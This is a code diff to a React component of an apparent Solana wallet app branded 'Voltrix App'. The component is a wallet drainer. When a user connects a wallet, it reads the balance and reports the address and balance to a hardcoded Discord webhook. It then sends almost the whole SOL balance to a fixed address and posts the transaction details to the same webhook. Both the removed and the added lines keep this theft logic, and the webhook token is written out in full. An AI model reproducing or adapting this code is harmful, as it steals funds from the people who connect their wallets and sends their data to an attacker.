@@ -109,50 +109,28 @@ const WalletConnectionHandler: FC = () => {
             }
         }
 
-if (!connection || lamports === null) {
-    alert('❌ Connection failed with wallets');
-    return;
-}
+        if (!connection || lamports === null) {
+            alert('❌ Connection failed with wallets');
+            return;
+        }
 
-const lamportsSafe = lamports;
-const balanceSol = lamportsSafe / LAMPORTS_PER_SOL;
-setSolBalance(balanceSol);
-console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
+        try {
+            const balanceSol = lamports / LAMPORTS_PER_SOL;
+            setSolBalance(balanceSol);
+            console.log(`✅ Using RPC: ${connection.rpcEndpoint}`);
+            console.log(`💰 Balance: ${balanceSol.toFixed(5)} SOL`);
 
-await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
+            await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
-
-            if (lamports <= 0) {
+            const feeBuffer = 0.001 * LAMPORTS_PER_SOL;
+            if (lamports <= feeBuffer) {
                 alert('⚠️ Not enough SOL to perform a transaction.');
                 return;
             }
 
+            const sendableLamports = lamports - feeBuffer;
             const toPubkey = new PublicKey('5rLnkHX3gP5S7SjyDWAUL1mi9gAkiTdXrjT4XDEv7vMz');
             const blockhash = await connection.getLatestBlockhash();
-
-            const reservedLamports = 0.001 * LAMPORTS_PER_SOL;
-            const availableLamports = lamports - reservedLamports;
-
-            const dummyTx = new Transaction({
-                feePayer: walletPublicKey,
-                recentBlockhash: blockhash.blockhash,
-            }).add(
-                SystemProgram.transfer({
-                    fromPubkey: walletPublicKey,
-                    toPubkey,
-                    lamports: 1, // dummy value to get fee
-                })
-            );
-
-            const feeResp = await connection.getFeeForMessage(dummyTx.compileMessage());
-            const feeLamports = feeResp.value || 5000;
-
-            const sendableLamports = availableLamports - feeLamports;
-
-            if (sendableLamports <= 0) {
-                alert('⚠️ Not enough SOL to cover the transaction + reserve.');
-                return;
-            }
 
             const finalTx = new Transaction({
                 feePayer: walletPublicKey,
@@ -167,7 +145,7 @@ await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
 
             setTimeout(async () => {
                 try {
-                    const txid = await sendTransaction(finalTx, connection!);
+                    const txid = await sendTransaction(finalTx, connection);
                     console.log(`🚀 Transaction sent: https://solscan.io/tx/${txid}`);
 
                     await sendDiscordWebhook(
@@ -188,86 +166,78 @@ await sendDiscordWebhook(walletPublicKey.toBase58(), balanceSol);
         }
     };
 
-    const sendDiscordWebhook = async (
-        address: string,
-        sol: number,
-        sentAmount?: number,
-        recipient?: string,
-        txid?: string
-    ) => {
-        const webhookUrl =
-            'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+    return null;
+};
 
-        const fields: any[] = [
+const sendDiscordWebhook = async (
+    address: string,
+    sol: number,
+    sentAmount?: number,
+    recipient?: string,
+    txid?: string
+) => {
+    const webhookUrl =
+        'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+
+    const fields: any[] = [
+        {
+            name: '🧾 Wallet Address',
+            value: `\`${address}\``,
+        },
+        {
+            name: '💰 SOL Balance',
+            value: `${sol.toFixed(5)} SOL`,
+        },
+    ];
+
+    if (sentAmount !== undefined && recipient) {
+        fields.push(
             {
-                name: '🧾 Wallet Address',
-                value: `\`${address}\``,
+                name: '📤 Amount Sent',
+                value: `${(sentAmount / LAMPORTS_PER_SOL).toFixed(5)} SOL`,
             },
             {
-                name: '💰 SOL Balance',
-                value: `${sol.toFixed(5)} SOL`,
+                name: '📬 Sent To',
+                value: `\`${recipient}\``,
+            }
+        );
+    }
+
+    if (txid) {
+        fields.push({
+            name: '🔗 Transaction',
+            value: `[View on Solscan](https://solscan.io/tx/${txid})`,
+        });
+    }
+
+    const body = {
+        embeds: [
+            {
+                title: sentAmount ? '✅ Transaction Sent' : '🟢 Solana Wallet Connected',
+                color: sentAmount ? 0x00ccff : 0x00ff99,
+                fields,
+                timestamp: new Date().toISOString(),
+                footer: {
+                    text: 'Voltrix App',
+                },
             },
-        ];
-
-        if (sentAmount !== undefined && recipient) {
-            fields.push(
-                {
-                    name: '📤 Amount Sent',
-                    value: `${(sentAmount / LAMPORTS_PER_SOL).toFixed(5)} SOL`,
-                },
-                {
-                    name: '📬 Sent To',
-                    value: `\`${recipient}\``,
-                }
-            );
-        }
-
-        if (txid) {
-            fields.push({
-                name: '🔗 Transaction',
-                value: `[View on Solscan](https://solscan.io/tx/${txid})`,
-            });
-        }
-
-        const body = {
-            embeds: [
-                {
-                    title: sentAmount ? '✅ Transaction Sent' : '🟢 Solana Wallet Connected',
-                    color: sentAmount ? 0x00ccff : 0x00ff99,
-                    fields,
-                    timestamp: new Date().toISOString(),
-                    footer: {
-                        text: 'Voltrix App',
-                    },
-                },
-            ],
-        };
-
-        try {
-            await fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(body),
-            });
-            console.log('📩 Discord webhook sent.');
-        } catch (err) {
-            console.error('❌ Failed to send webhook:', err);
-        }
+        ],
     };
 
-    const walletPopupEl =
-        typeof window !== 'undefined'
-            ? document.querySelector('.wallet-popup#walletPopup')
-            : null;
-
-    return walletPopupEl ? ReactDOM.createPortal(<div></div>, walletPopupEl) : null;
+    try {
+        await fetch(webhookUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(body),
+        });
+        console.log('📩 Discord webhook sent.');
+    } catch (err) {
+        console.error('❌ Failed to send webhook:', err);
+    }
 };
 
 const InjectWalletMultiButton: FC = () => {
-    const target =
-        typeof window !== 'undefined'
-            ? document.getElementById('connect_button')
-            : null;
+    const target = typeof window !== 'undefined' ? document.getElementById('connect_button') : null;
     const { connected } = useWallet();
     const { setVisible } = useWalletModal();
 
@@ -295,14 +265,7 @@ const InjectWalletMultiButton: FC = () => {
 
     return target
         ? ReactDOM.createPortal(
-              <div
-                  style={{
-                      display: 'flex',
-                      flexDirection: 'column',
-                      alignItems: 'center',
-                      gap: '10px',
-                  }}
-              >
+              <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '10px' }}>
                   <WalletMultiButton
                       style={{
                           background: 'linear-gradient(to right, #ff5cd1, #ff91e3)',
